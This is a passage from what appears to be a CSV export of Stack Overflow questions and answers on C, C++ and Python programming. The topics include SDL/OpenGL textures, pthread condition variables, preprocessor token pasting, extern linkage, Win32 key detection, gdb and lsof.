glBindTexture(GL_TEXTURE_2D, textureObjOpenGLlogo);

//define the parameters of that texture object
//how the texture should wrap in s direction
glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);
//how the texture should wrap in t direction
glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);
//how the texture lookup should be interpolated when the face is smaller than the texture
glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
//how the texture lookup should be interpolated when the face is bigger than the texture
glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);

//send the texture image to the graphic card
glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, texture-&gt;w, texture-&gt;h, 0, GL_RGB, GL_UNSIGNED_BYTE, texture-&gt; pixels);

//clean the SDL surface
SDL_FreeSurface(texture);
</code></pre>

<p>The code compiles without errors or warnings !</p>

<p>I've tired all the files formats but this always produces that ugly result :</p>

<p><img src=""http://i34.tinypic.com/ipbpxe.jpg"" alt=""result""></p>

<p>I'm using : SDL_image 1.2.9 &amp; SDL 1.2.14 with XCode 3.2 under 10.6.2</p>

<p>Does anyone knows how to fix this ?</p>
","9530","","<p>I think <a href=""http://stackoverflow.com/questions/1726122/sdlimage-c-opengl-program-imgload-produces-fuzzy-images/1726165#1726165"">greyfade</a> has the right answer, but another thing you should be aware of is the need to lock surfaces.  This is probably not the case, since you're working with an in-memory surface, but normally you need to lock surfaces before accessing their pixel data with <a href=""http://www.libsdl.org/cgi/docwiki.cgi/SDL%5FLockSurface"" rel=""nofollow""><code>SDL_LockSurface()</code></a>.  For example:</p>

<pre><code>bool lock = SDL_MUSTLOCK(texture);
if(lock)
    SDL_LockSurface(texture);  // should check that return value == 0
// access pixel data, e.g. call glTexImage2D
if(lock)
    SDL_UnlockSUrface(texture);
</code></pre>
"
"<p>I'm rewriting an old program to do some new stuff, and suddenly I get a segmentation fault error on the following line of code:</p>

<pre><code>time_t seconds_since_time_begun = time(0);
</code></pre>

<p>Why, oh why?</p>

<p><strong>Update:</strong><br>
I have included the time.h header file in my code, and when I tried what pmg suggested below, both variables were 4 in size.</p>

<p>When I tried the following:</p>

<pre><code>printf(""4\n"");
// time_t seconds_since_time_begun = time(0);
printf(""5\n"");
</code></pre>

<p>I still get segmentation fault right after ""4"" has been printed, even when the line where time() is called is commented out. ""5"" is not outputted. How is this possible?</p>

<p><strong>Update 2:</strong><br>
I rebuilt my function step by step to try to isolate where the error occurred in my code, and I think I found the problem. I'm not sure what was wrong but it had something to do with a comparison between an integer array value and 0. So, I don't think the segfault was caused by my call to time(0) .. but I'm still not sure what actually happened. Anyways, problem solved. Thanks guys.</p>
","9530","","<p>Perhaps you have an absurdly large object in your stack frame that's overflowing the stack?  See <a href=""http://www.yosefk.com/blog/the-c-sucks-series-petrifying-functions.html"" rel=""nofollow"">this blog post</a> for a detailed example of how that can occur and an analysis of the situation.  The <a href=""http://linux.die.net/man/2/time"" rel=""nofollow""><code>time(2)</code></a> function allows <code>NULL</code> to be passed to it, and it's highly unlikely your <code>time()</code> implementation has a bug.</p>
"
"<p>How can I wait for a detached thread to finish in C++?</p>

<p>I don't care about an exit status, I just want to know whether or not the thread has finished.</p>

<p>I'm trying to provide a synchronous wrapper around an asynchronous thirdarty tool.  The problem is a weird race condition crash involving a callback.  The progression is:</p>

<ol>
<li>I call the thirdparty, and register a callback</li>
<li>when the thirdparty finishes, it notifies me using the callback -- in a detached thread I have no real control over.</li>
<li>I want the thread from (1) to wait until (2) is called.</li>
</ol>

<p>I want to wrap this in a mechanism that provides a blocking call.  So far, I have:</p>

<pre><code>class Wait {
  public:
  void callback() {
    pthread_mutex_lock(&amp;m_mutex);
    m_done = true;
    pthread_cond_broadcast(&amp;m_cond);
    pthread_mutex_unlock(&amp;m_mutex);
  }

  void wait() {
    pthread_mutex_lock(&amp;m_mutex);
    while (!m_done) {
      pthread_cond_wait(&amp;m_cond, &amp;m_mutex);
    }
    pthread_mutex_unlock(&amp;m_mutex);
  }

  private:
  pthread_mutex_t m_mutex;
  pthread_cond_t  m_cond;
  bool            m_done;
};

// elsewhere...
Wait waiter;
thirdparty_utility(&amp;waiter);
waiter.wait();
</code></pre>

<p>As far as I can tell, this should work, and it usually does, but sometimes it crashes.  As far as I can determine from the corefile, my guess as to the problem is this:</p>

<ol>
<li>When the callback broadcasts the end of m_done, the wait thread wakes up</li>
<li>The wait thread is now done here, and Wait is destroyed.  All of Wait's members are destroyed, including the mutex and cond.</li>
<li>The callback thread tries to continue from the broadcast point, but is now using memory that's been released, which results in memory corruption.</li>
<li>When the callback thread tries to return (above the level of my poor callback method), the program crashes (usually with a SIGSEGV, but I've seen SIGILL a couple of times).</li>
</ol>

<p>I've tried a lot of different mechanisms to try to fix this, but none of them solve the problem.  I still see occasional crashes.</p>

<p><strong>EDIT</strong>:  More details:</p>

<p>This is part of a massively multithreaded application, so creating a static Wait isn't practical.</p>

<p>I ran a test, creating Wait on the heap, and deliberately leaking the memory (i.e. the Wait objects are never deallocated), and that resulted in no crashes.  So I'm sure it's a problem of Wait being deallocated too soon.</p>

<p>I've also tried a test with a <code>sleep(5)</code> after the unlock in <code>wait</code>, and that also produced no crashes.  I hate to rely on a kludge like that though.</p>

<p><strong>EDIT</strong>:  ThirdParty details:</p>

<p>I didn't think this was relevant at first, but the more I think about it, the more I think it's the real problem:</p>

<p>The thirdparty stuff I mentioned, and why I have no control over the thread:  this is using CORBA.</p>

<p>So, it's possible that CORBA is holding onto a reference to my object longer than intended.</p>
","9530","","<p>Are you initializing and destroying the mutex and condition var properly?</p>

<pre><code>Wait::Wait()
{
    pthread_mutex_init(&amp;m_mutex, NULL);
    pthread_cond_init(&amp;m_cond, NULL);
    m_done = false;
}

Wait::~Wait()
{
    assert(m_done);
    pthread_mutex_destroy(&amp;m_mutex);
    pthread_cond_destroy(&amp;m_cond);
}
</code></pre>

<p>Make sure that you aren't prematurely destroying the <code>Wait</code> object -- if it gets destroyed in one thread while the other thread still needs it, you'll get a race condition that will likely result in a segfault.  I'd recommend making it a global static variable that gets constructed on program initialization (before <code>main()</code>) and gets destroyed on program exit.</p>
"
"<p>hey i am new to the macports thing as i recently switched to the mac. as i was thinking of developing some applications in my mac i wanted all the usual gnu and opensource tools i need. but i had a small confusion. i was installing git with macports and i noticied it installed a lot of packages like Perl that i already have in my machne. so i was thinking won't there be any conflicts and how does one know which version is used. the macports one or the apple one?</p>
","9530","","<p>There shouldn't be any conflicts, since MacPorts installs all of its programs under a completely separate directory hierarchy in <code>/opt/local/</code>.</p>

<p>If you have multiple versions of software installed (e.g. the default OS X Perl and MacPorts' Perl), then it depends on the order of directories in your <code>$PATH</code> environment variable.  MacPorts typically sets itself up with its <code>bin</code> directories earlier in your path, so saying <code>perl</code> at the command line will invoke the MacPorts Perl, not the OS X Perl.</p>
"
"<p>In C, I want to display every single character that the user type as *
(Ex, Please type in your password: *****)</p>

<p>I'm searching around but can't be able to find a solution for this. 
I'm working on Ubuntu. Does anybody know a good way?</p>
","9530","","<p>Take a look at the <a href=""http://www.gnu.org/software/ncurses/"" rel=""nofollow"">ncurses</a> library.  It's a very liberally licensed library with a huge amount of functionality on a large variety of systems.  I haven't used it very much, so I'm not sure exactly which functions you'd want to call, but if take a look at the <a href=""http://invisible-island.net/ncurses/man/ncurses.3x.html"" rel=""nofollow"">documentation</a>, I'm sure you'll find what you want.</p>
"
"<p>I have a function like below:</p>

<p>void add(int&amp;,float&amp;,float&amp;);</p>

<p>and when I call:</p>

<p>add(1,30,30)</p>

<p>it does not compile.</p>

<p>add(1,30.0,30.0) also does not compile.</p>

<p>It seems that in both cases, it gets implicitly converted to double instead of float.</p>

<p>So, do you suggest that it is better to re-define add as add(int&amp;,double&amp;,double&amp;)? Is there any other way of passing making add(1,30,30) work other than casting 30 with float or assigning like ""float x = 30 ; add(1,x,x)"" ?</p>

<p>I used to think that the compiler will be able to detect that float is a super-set of integer and so would compile it successfully. Apparently, that is not the case.</p>

<p>Thanks!</p>
","9530","","<p>Your function takes its parameters by reference, not by value, and you can't pass constant integer/floating-point values by non-const reference.  You should either change your function to take its parameters by value, or pass actual variables instead of constants, e.g.:</p>

<pre><code>int x = 1;
float y = 30, z = 30;
add(x, y, z);
</code></pre>

<p>You can implicitly cast an <code>int</code> to a <code>float</code> or <code>double</code>, but you cannot implicitly cast an <code>int&amp;</code> to a <code>float&amp;</code>.</p>
"
"<p>I'm exploiting the behavior of the constructors of C++ global variables to run code at startup in a simple manner. It's a very easy concept but a little difficult to explain so let me just paste the code:</p>

<pre><code>struct _LuaVariableRegistration
{
    template&lt;class T&gt;
    _LuaVariableRegistration(const char* lua_name, const T&amp; c_name) {
    	/* ... This code will be ran at startup; it temporarily saves lua_name and c_name in a std::map and when Lua is loaded it will register all temporarily global variables in Lua. */
    }
};
</code></pre>

<p>However manually instantiating that super ugly class every time one wants to register a Lua global variable is cumbersome; that's why I created the following macro:</p>

<pre><code>#define LUA_GLOBAL(lua_name, c_name) static Snow::_LuaVariableRegistration _____LuaGlobal ## c_name (lua_name, c_name);
</code></pre>

<p>So all you have to do is put that in the global scope of a cpp file and everything works perfectly:</p>

<pre><code>LUA_GLOBAL(""LuaIsCool"", true);
</code></pre>

<p>There you go! Now in Lua <code>LuaIsCool</code> will be a variable initialized to true!</p>

<p>But, here is the problem:</p>

<pre><code>LUA_GLOBAL(""ACCESS_NONE"", Access::None);
</code></pre>

<p>Which becomes:</p>

<pre><code>static Snow::_LuaVariableRegistration _____LuaGlobalAccess::None (""ACCESS_NONE"", &amp;Access::None);
</code></pre>

<p>:((
I need to concatenate <code>c_name</code> in the macro or it will complain about two variables with the same name; I tried replacing it with <code>__LINE__</code> but it actually becomes <code>_____LuaGlobalAccess__LINE__</code> (ie it doesn't get replaced).</p>

<p>So, is there a way to somehow obtain an unique string, or any other workaround?</p>

<p>Thanks!</p>

<p>PS: yes I know names that begin with _ are reserved; I use them anyway for purposes like this being careful to pick names that the standard library is extremely unlikely to ever use. Additionally they are in a namespace.</p>
","9530","","<p>You need to add an extra layer of macros to make the preprocessor do the right thing:</p>

<pre><code>#define TOKENPASTE(x, y) x ## y
#define TOKENPASTE2(x, y) TOKENPASTE(x, y)

#define LUA_GLOBAL(lua_name, c_name) ... TOKENPASTE2(_luaGlobal, __LINE__) ...
</code></pre>

<p>Some compilers also support the <code>__COUNTER__</code> macro, which expands to a new, unique integer every time it is evaluated, so you can use that in place of <code>__LINE__</code> to generate unique identifiers.  I'm not sure if it's valid ISO C, although gcc accepts its use with the <code>-ansi -pedantic</code> options.</p>
"
"<p>What does exactly this mean?</p>

<pre><code>typedef _W64 unsigned int UINT_PTR, *PUINT_PTR;
</code></pre>

<p>Does this mean that *PUINT_PTR is a pointer (obviously) and UINT_PTR is NOT a pointer? If so, why is it called UINT_PTR ? (which I would read as unsigned int pointer, or pointer to unsigned int) </p>

<p>Thanks</p>
","9530","","<p>Yes, this means that <code>PUINT_PTR</code> is a pointer and <code>UINT_PTR</code> is not a pointer.  It's a little confusing, but a <code>UINT_PTR</code> (as well as the more standardized <code>uintptr_t</code>) is defined to be an unsigned integer that is guaranteed to be large enough to hold a pointer value.  It's typically used for tricky code where pointers are put into integer values and vice-versa.</p>

<p>The <code>_W64</code> annotation is a note to the Miscrosoft compiler that when compiling for a 64-bit target, the variable should be 64 bits wide instead of the usual 32, since on 64-bit platforms, pointers are 64 bits, but <code>unsigned int</code>s are usually still 32 bits.  This ensures that <code>sizeof(UINT_PTR) &gt;= sizeof(void*)</code> for all target platforms.</p>

<p>The second declaration just declares <code>PUINT_PTR</code> to be a pointer to a <code>_W64 unsigned int</code>, or more specifically, a pointer to a <code>UINT_PTR</code>.</p>
"
"<pre><code>&gt;&gt;&gt; numerator = 29
&gt;&gt;&gt; denom = 1009
&gt;&gt;&gt; print str(float(numerator/denom))
0.0
</code></pre>

<p>I just want it to return a decimal...</p>
","9530","","<p>In Python 2.x, division works like it does in C-like languages: if both arguments are integers, the result is truncated to an integer, so 29/1009 is 0.  0 as a float is 0.0.  To fix it, cast to a float before dividing:</p>

<pre><code>print str(float(numerator)/denominator)
</code></pre>

<p>In Python 3.x, the division acts more naturally, so you'll get the correct mathematical result (within floating-point error).</p>
"
"<p>Getting started with ImageMagic and trying to find a way to do this... If an image is less than 50 pixels tall or 50 pixels wide, I'd like to place it (un-scaled) in the horizontal/vertical center of a new 50x50 pixel canvas on top of a white background - and save that as the new image. Anyone know if this is possible with ImageMagick?  Thanks!</p>
","9530","","<p>See <a href=""http://www.imagemagick.org/Usage/crop/"" rel=""nofollow"">cutting and bordering</a> for a huge number of examples.  Here's one simple way you might do it:</p>

<pre><code>convert input.png -bordercolor Black -border 5x5 output.png
</code></pre>

<p>Of course, you'll need to calculate the size of the border to add (if any) based on the dimensions of the input image.  Are you using an ImageMagick API, or just the command line tools?</p>
"
"<p>Is there a g++ equivalent to Visual Studio's <code>__declspec(novtable)</code> argument? </p>

<p>Basically, in a pure virtual base class the <code>__declspec(novtable)</code> argument can be used to suppress the creation of a vtable for the base class as well as vtable initialization/deinitialization code in the contstructor/destructor respectively. E.g.,</p>

<pre><code>class __declspec(novtable) PureVirtualBaseClass
{
    public: 
       PureVirtualBaseClass(){}
       virtual ~PureVirtualBaseClass() = 0;
};
</code></pre>

<p>See <a href=""http://msdn.microsoft.com/en-us/magazine/cc301398.aspx"">Paul DiLascia's article</a> for more info. Also see my related <a href=""http://stackoverflow.com/questions/1801258/does-using-declspecnovtable-on-abstract-base-classes-affect-rtti-in-any-way"">question</a>.</p>
","9530","","<p>I don't think there is one -- if there was, it would be listed under the <a href=""http://gcc.gnu.org/onlinedocs/gcc/Type-Attributes.html"" rel=""nofollow"">type attributes page</a> of the GCC manual.  GCC uses type attributes to add extra annotations to types (such as alignment and padding), but there is no type attribute equivalent to <code>__declspc(novtable)</code> listed there.</p>

<p>I also don't see any compiler flag in the <a href=""http://linux.die.net/man/1/gcc"" rel=""nofollow"">man page</a> relating to this optimization.</p>
"
"<p>How does the following example usage of extern specifer behave.</p>

<p>We have a global variable int x both in files one.c and two.c
We want to use these in three.c so have declared this variable in three.c as   </p>

<p><code>extern int x;</code>  </p>

<p>What would happen when we compile and link these files?</p>

<p>My answer is: compilation of all these files should succeed, however the linker should flag an error at linking, due to multiple declarations of x.
Would there be any difference in behavior in C++ ?  </p>

<p>Is these any way to refer to int x (in three.c) simultaneously from both files, in C and C++.
In C++, I guess we can use namespaces to acheive this. Right?  </p>
","9530","","<p>By default, global variables have <em>external linkage</em>, which means that they can be used by other source files (or ""translation units"").  If you instead declare your global variables with the <code>static</code> keyword, they will have <em>internal linkage</em>, meaning they will not be usable by other source files.</p>

<p>For variables with external linkage, you can't have multiple variables with the same name, or the linker will complain.  You can have two variables with the same name, though, as long as at least one has internal linkage, and of course you can't reference both of them in the same source file.</p>

<p>An <code>extern</code> declaration is just saying to the compiler ""here is the name of some variable with external linkage defined in another translation unit,"" allowing you to refer to that variable.</p>

<p>C++ is exactly the same, except for the addition of namespaces.  If global variables are put inside a namespace, then they can have the same name without linker errors, provided they are in different namespaces.  Of course, all references to those variables then have to either refer to the full name <code>namespace::var_name</code>, or use a <code>using</code> declaration to establish a local namespace context.</p>

<p>C++ also has anonymous namespaces, which are entirely equivalent to using the <code>static</code> keyword for global variables in C: all variables and functions declared inside an anonymous namespace have internal linkage.</p>

<p>So, to answer your original question, you are right -- compilation would succeed, but linking would fail, due to multiple definitions of the variable <code>x</code> with external linkage (specifically, from the translation units <code>one.c</code> and <code>two.c</code>).</p>

<p>From <code>three.c</code>, there is no way to refer simultaneously to both variables <code>x</code>.  You'll need to rename <code>x</code> in one or both modules, or switch to C++ and put at least one <code>x</code> inside a namespace.</p>
"
"<p>The hash structures I am aware of - HashTable, HashSet &amp; HashMap.</p>

<p>Do they all use the bucket structure - ie when two hashcodes are <strike>similar</strike> <em>exactly the same</em> one element does not overwrite the other, instead they are placed in the same bucket associated with that hashcode?</p>
","9530","","<p>No -- <a href=""http://en.wikipedia.org/wiki/Open%5Faddressing"" rel=""nofollow"">open addressing</a> is an alternate method of representing hash tables, where objects are stored directly in the table, instead of residing in a linked list.  Only one object can be stored at a given index, so resolving collisions is more complicated.</p>

<p>When adding an object for which another object already resides at the same index, a probing sequence is used to determine the new index at which to store the new object.  Removing objects is also more complicated, since you if you remove an object, you need to leave a marker that says ""there used to be an object here""; for more details, see Wikipedia.</p>

<p>Open addressing is preferable when the objects being stored as small and will rarely be deleted.  Open addressing has improved cache performance, since you don't need to go through an extra level of indirection walking a linked list.</p>

<p>The classes you mentioned -- <code>HashTable</code>, <code>HashSet</code>, and <code>HashMap</code> don't use open addressing, but you could easily create new classes that implemented open addressing and provided the same APIs as those classes.</p>
"
"<p>Lets say I have a function that needs to return some integer value. but it can also fail, and I need to know when it does.</p>

<p>Which is the better way?</p>

<pre><code>public int? DoSomethingWonderful()
</code></pre>

<p>or</p>

<pre><code>public bool DoSomethingWonderful(out int parameter)
</code></pre>

<p>this is probably more of a style question, but I'm still curious which option people would take.</p>

<p>Edit: clarification, this code talks to a black box (lets call it a cloud. no, a black box. no, wait. cloud. yes). I dont care <em>why</em> it failed. I would just need to know if I have a valid value or not.</p>
","9530","","<p>If there's only one way it can fail, or if you'll never need to know <em>why</em> it failed, I'd say it's probably simpler and easier to go with the nullable return value.</p>

<p>Conversely, if there are multiple ways it could fail, and the calling code could want to know exactly why it failed, then go with the out parameter and return an error code instead of a bool (alternatively, you could throw an exception, but based on your question, it seems you've already decided not to throw an exception).</p>
"
"<p>I'm writing a few unit tests of some code which uses sys.stderr.write to report errors in input. This is as it should be, but this clobbers the unit test output. Is there any way to tell Python to not output error messages for single commands, à la <code>2&gt; /dev/null</code>?</p>
","9530","","<p>You could create a dummy file object that did nothing with its output, and set stderr to that:</p>

<pre><code>class NullWriter:
    def write(self, s):
        pass

sys.stderr = NullWriter()
</code></pre>

<p>If you only want to quiet stderr for a specific duration, you can use a <code>with</code> statement like so:</p>

<pre><code>class Quieter:
    def __enter__(self):
        self.old_stderr = sys.stderr
        sys.stderr = NullWriter()

    def __exit__(self, type, value, traceback):
        sys.stderr = self.old_stderr

with Quieter():
    # Do stuff; stderr will be suppressed, and it will be restored
    # when this block exits
</code></pre>

<p>Requires Python 2.6 or higher, or you can use it in Python 2.5 with a <code>from __future__ import with_statement</code>.</p>
"
"<p>On Win32, I wonder how to detect whether Left Shift or Right ALT is pressed using Perl, Python, or Ruby (or even in C)?  </p>

<p>Not just for the current window, but the global environment overall.  Example: when I am typing a document, I can press Right ALT to start the music player written in Ruby, and then press Right ALT again and it can pause or stop the program.  thanks.</p>
","9530","","<p>If you want to know the current state of the keys <em>right now</em>, you can use <a href=""http://msdn.microsoft.com/en-us/library/ms646293%28VS.85%29.aspx"" rel=""nofollow""><code>GetAsyncKeyState()</code></a> with an argument of <code>VK_LSHIFT</code> or <code>VK_RMENU</code> for left shift and right alt respectively.  Make sure to test the most significant bit of the result, since the result contains more than one bit of information, e.g.</p>

<pre><code>if(GetAsyncKeyState(VK_LSHIFT) &amp; 0x8000)
    ; // left shift is currently down
</code></pre>

<p>If you instead want to be notified of keypresses instead of polling them asynchronously, you should listen for the <a href=""http://msdn.microsoft.com/en-us/library/ms646280%28VS.85%29.aspx"" rel=""nofollow""><code>WM_KEYDOWN</code></a> window notification.  Put something like this in your window's message handler:</p>

<pre><code>LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)
{
    switch(msg)
    {
    ...
    case WM_KEYDOWN:
        if(wparam == VK_LSHIFT)
            ; // left shift was pressed
        // etc.
        break;
    }
}
</code></pre>

<p>You'll also have to handle the <code>WM_KEYUP</code> message to know when keys are released.</p>
"
"<p>I have a sorted struct of IPs where I need to get the number of unique IPs, for some reason the way I'm doing it, is giving me a ""0"" as a result. Which in this case there should be 12 unique ips.</p>

<p>The struct array containing the following elements:</p>

<pre><code>195.55.121.242
212.80.168.34 
65.55.106.114 
65.55.207.30  
65.55.207.95  
65.55.230.237 
66.249.68.16  
66.249.68.16  
66.249.68.16  
67.195.37.172 
67.195.37.172 
67.218.116.162
80.59.182.176 
80.59.182.176 
83.213.81.220 
83.213.81.220 
83.43.21.186  
83.43.21.186
</code></pre>

<p>Code:</p>

<pre><code>typedef struct {
    char *ip;
}thestruct;

qsort(mystruct, 18, sizeof(thestruct*), cmpme);

int un = 0;
for (i=0; i&lt;18; i++) {
    if (strcmp(mystruct[i++]-&gt;ip,mystruct[i]-&gt;ip)!=0) {
        un++;
    }
}
</code></pre>

<p>By doing a simple gets-strcmp with only one element (ip) I get that both strings are equal. Which tells me that strcmp is treating it as a string.</p>

<p>I'm not quite sure what I am missing. </p>

<p>Any help will be appreciate it.</p>

<p>Thanks</p>
","9530","","<p>Look carefully at this line:</p>

<pre><code>if (strcmp(mystruct[i++]-&gt;ip,mystruct[i]-&gt;ip)!=0)
</code></pre>

<p>You're comparing index <code>i</code> to index <code>i</code> (which are equal, since they're the same) and then incrementing <code>i</code>.  (Actually, this is undefined behavior, since you're modifying <code>i</code> and reading it more than once before a sequence point).</p>

<p>You really want to do this:</p>

<pre><code>if (strcmp(mystruct[i + 1]-&gt;ip,mystruct[i]-&gt;ip)!=0)
</code></pre>

<p>to compare index <code>i+1</code> to index <code>i</code> without touching <code>i</code>, since <code>i</code> is incremented in the <code>for</code> loop.  Also, <code>i</code> should only loop from 0 to 17, not 0 to 18, since you don't want to read past the end of the array.</p>
"
"<p>Would it be possible to get an answer in pseudocode please, guys?</p>

<p>How could I write a method that, in O(n log n), takes a string array and removes null entries.</p>

<p>I appreciate you can't alter the array size which means I need to copy the contents over to a new one but I can only seem to do it with nested for-loops which compresses my algorithm time and would then become O(n^2)</p>
","9530","","<p>You need to make a copy of the array, but you only need to make a shallow copy, not a deep copy -- the individual strings don't need to be copied.  So it would look something like this:</p>

<pre><code>create new output array O
for each string S in the input array I
    if S is not null
        add S to O
</code></pre>

<p>If you're using <code>ArrayList</code>s, you can use this as-is; however, if you're using plain old Java arrays, you can't resize it each time you add an element.  So, instead, you'll need to count the number of non-null entries first, then create an output array of the appropriate size, then loop through the input array again.</p>
"
"<p>Here's a very basic C snippet to open and read a file:</p>

<pre><code>  int fd = open(""test.txt"",O_RDONLY);
  char buf[128];
  int reader = read(fd,buf,128);
  int i;
    for (i=0;i&lt;strlen(buf);i++)
    {
    	printf(""%i: I read: %c"", i, (int)buf[i]);
    }
</code></pre>

<p>I'm also including these standard headers:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
</code></pre>

<p>This code will work fine in C, and since Objective-C is a superset of C I expected it to work fine in Obj-C as well. But instead I'm getting all garbage data, such as:</p>

<pre><code>0: I read: –
1: I read: *
2: I read: :
</code></pre>

<p>Why?</p>
","9530","","<p>Summarizing the responses so far, and adding my own observations:</p>

<p>You should check the return value from <code>open()</code> and <code>read()</code>.  If they fail, you're going to blindly continue on and print garbage.</p>

<p><code>read()</code> returns the number of characters read, or -1 in case of error.  It does NOT null-terminate its buffer, so using <code>strlen()</code> to find the amount of data read is wrong.</p>

<p>You shouldn't put a call to <code>strlen()</code> in the loop test condition, since you'll be re-evaluating it each iteration.</p>

<p>The casting of <code>buf[i]</code> to <code>int</code> in the <code>printf</code> statement is unnecessary.  The extra arguments to variadic functions such as <code>printf</code> (that is, all of the arguments that make up the <code>...</code>) undergo default argument promotion as follows:</p>

<ul>
<li><code>char</code>s, <code>short</code>s, and their unsigned counterparts are promoted to <code>int</code>s</li>
<li><code>float</code>s are promoted to <code>double</code>s</li>
</ul>

<p>Without a cast, <code>buf[i]</code> would get implicitly promoted to an <code>int</code> anyways, so adding the cast, while correct, makes the code more confusing to anyone reading it.</p>

<p>So, your code should look like this:</p>

<pre><code>int fd = open(""test.txt"",O_RDONLY);
if(fd &lt; 0)
{
    fprintf(stderr, ""open failed: %s\n"", strerror(errno));
    return;
}
char buf[128];
// It's better to use sizeof(buf) here, so we don't have to change it in case we
// change the size of buf.  -1 to leave space for the null terminator
int reader = read(fd,buf,sizeof(buf)-1);
if(reader &lt; 0)
{
    fprintf(stderr, ""read failed: %s\n"", strerror(errno));
    close(fd);
    return;
}
buf[reader] = 0;  // add null terminator for safety
int i;
for (i=0; i &lt; reader; i++)
{
    printf(""%i: I read: %c"", i, buf[i]);
}
</code></pre>
"
"<p>I am debugging a networking code and want to print ip addresses which are declared as <code>int32</code>.
  when i print it using gdb print command, i get some values which is not much meaningful. </p>

<p>How can i possibly print them in meaningful format?</p>
","9530","","<p>Just use <a href=""http://linux.die.net/man/3/inet%5Fntoa"" rel=""nofollow""><code>inet_ntoa(3)</code></a> as so:</p>

<pre><code>(gdb) p (char*)inet_ntoa(0x01234567)  # Replace with your IP address
$1 = 0xa000b660 ""103.69.35.1""
</code></pre>
"
"<p>I have a auto-generated C++ source file, around 40 MB in size. It largely consists of push_back commands for some vectors and string constants that shall be pushed.</p>

<p>When I try to compile this file, g++ exits and says that it couldn't reserve enough virtual memory (around 3 GB). Googling this problem, I found that using the command line switches</p>

<pre><code>--param ggc-min-expand=0 --param ggc-min-heapsize=4096
</code></pre>

<p>may solve the problem. They, however, only seem to work when optimization is turned on.</p>

<p>1) Is this really the solution that I am looking for?</p>

<p>2) Or is there a faster, better (compiling takes ages with these options acitvated) way to do this?</p>

<p>Best wishes,</p>

<p>Alexander</p>

<p><strong>Update:</strong> Thanks for all the good ideas. I tried most of them. Using an array instead of several push_back() operations reduced memory usage, but as the file that I was trying to compile was so big, it still crashed, only later. In a way, this behaviour is really interesting, as there is not much to optimize in such a setting -- what does the GCC do behind the scenes that costs so much memory? (I compiled with deactivating all optimizations as well and got the same results)</p>

<p>The solution that I switched to now is reading in the original data from a binary object file that I created from the original file using <code>objcopy</code>. This is what I originally did not want to do, because creating the data structures in a higher-level language (in this case Perl) was more convenient than having to do this in C++.</p>

<p>However, getting this running under Win32 was more complicated than expected. objcopy seems to generate files in the ELF format, and it seems that some of the problems I had disappeared when I manually set the output format to <code>pe-i386</code>. The symbols in the object file are by standard named after the file name, e.g. converting the file <code>inbuilt_training_data.bin</code> would result in these two symbols: binary_inbuilt_training_data_bin_start and binary_inbuilt_training_data_bin_end. I found some tutorials on the web which claim that these symbols should be declared as <code>extern char _binary_inbuilt_training_data_bin_start;</code>, but this does not seem to be right -- only <code>extern char binary_inbuilt_training_data_bin_start;</code> worked for me.</p>
","9530","","<p>If you're just generating a punch of calls to <code>push_back()</code> in a row, you can refactor it into something like this:</p>

<pre><code>// Old code:
v.push_back(""foo"");
v.push_back(""bar"");
v.push_back(""baz"");

// Change that to this:
{
    static const char *stuff[] = {""foo"", ""bar"", ""baz""};
    v.insert(v.end(), stuff, stuff + ARRAYCOUNT(stuff));
}
</code></pre>

<p>Where <code>ARRAYCOUNT</code> is a macro defined as follows:</p>

<pre><code>#define ARRAYCOUNT(a) (sizeof(a) / sizeof(a[0]))
</code></pre>

<p>The extra level of braces is just to avoid name conflicts if you have many such blocks; alternatively, you can just generate a new unique name for the <code>stuff</code> placeholder.</p>

<p>If that still doesn't work, I suggest breaking your source file up into many smaller source files.  That's easy if you have many separate functions; if you have one enormous function, you'll have to work a little harder, but it's still very doable.</p>
"
"<p>Is it possible in C++ to have a member function that is both static and virtual? Apparently, there isn't a straightforward way to do it (<code>static virtual member();</code> is a complie error), but is there at least a way to acheive the same effect?</p>

<p>I.E:</p>

<pre><code>struct Object
{
     struct TypeInformation;

     static virtual const TypeInformation &amp;GetTypeInformation() const;
};

struct SomeObject : public Object
{
     static virtual const TypeInformation &amp;GetTypeInformation() const;
};
</code></pre>

<p>It makes sense to use <code>GetTypeInformation()</code> both on an instance (<code>object-&gt;GetTypeInformation()</code>) and on a class (<code>SomeObject::GetTypeInformation()</code>), which can be useful for comparsions and vital for templates.</p>

<p>The only ways I can think of involves writing two functions / a function and a constant, per class, or use macros.</p>

<p>Any other solutions?</p>
","9530","","<p>No, there's no way to do it, since what would happen when you called <code>Object::GetTypeInformation()</code>?  It can't know which derived class version to call since there's no object associated with it.</p>

<p>You'll have to make it a non-static virtual function to work properly; if you also want to be able to call a specific derived class's version non-virtually without an object instance, you'll have to provide a second redunduant static non-virtual version as well.</p>
"
"<p>Just wondering if there are methods already implemented for handling linear interpolation between two numbers in foundation/something else that comes with Xcode? It's hardly an advanced thing to implement yourself, but I usually find myself reimplementing things that have already been implemented, and it's nice to use functionality that already exists (plus it's more standardized).</p>

<p>So what I'd like is something like this:</p>

<pre><code>lerp(number1, number2, numberBetween0And1);

// Example:
lerp(0.0, 10.0, .5); // returns 5.0
</code></pre>

<p>Does it exist?</p>
","9530","","<p>No, but it's an easy one-liner:</p>

<pre><code>inline double lerp(double a, double b, double t)
{
    return a + (b - a) * t;
}

inline float lerpf(float a, float b, float t)
{
    return a + (b - a) * t;
}
</code></pre>
"
"<p>How I can see from shell what socket options are set? In particular 
I'm interesting to know if SO_BROADCAST is set?</p>
","9530","","<p>You can use <a href=""http://linux.die.net/man/8/lsof"" rel=""nofollow""><code>lsof(8)</code></a>.  If <code>PID</code> is the process ID and <code>FD</code> is the file descriptor number of the socket you're interested in, you can do this:</p>

<pre><code>lsof -a -p PID -d FD -T f
</code></pre>

<p>To list all IPv4 sockets of a process:</p>

<pre><code>lsof -a -p PID -i 4 -T f
</code></pre>

